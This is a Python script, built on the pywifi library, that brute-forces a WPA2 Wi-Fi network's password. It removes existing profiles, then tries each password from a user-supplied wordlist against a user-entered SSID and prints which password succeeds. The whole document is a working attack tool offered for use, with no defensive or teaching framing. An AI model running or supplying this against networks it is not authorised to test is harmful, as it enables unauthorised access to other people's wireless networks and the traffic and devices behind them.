import pywifi
from pywifi import const
import time

def connect_to_wifi(ssid, password):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    iface.connect(tmp_profile)
    time.sleep(5)
    return iface.status() == const.IFACE_CONNECTED

def password_generator(wordlist_path):
    with open(wordlist_path, 'r', encoding='utf-8') as f:
        for password in f:
            yield password.strip()

def brute_force(ssid, wordlist_path):
    password_gen = password_generator(wordlist_path)
    for password in password_gen:
        if connect_to_wifi(ssid, password):
            print(f"Successfully connected to {ssid} with password: {password}")
            return
        else:
            print(f"Failed to connect to {ssid} with password: {password}")

if __name__ == "__main__":
    ssid = input("Enter the SSID of the WiFi network: ")
    wordlist_path = input("Enter the path to the wordlist file: ")
    brute_force(ssid, wordlist_path)
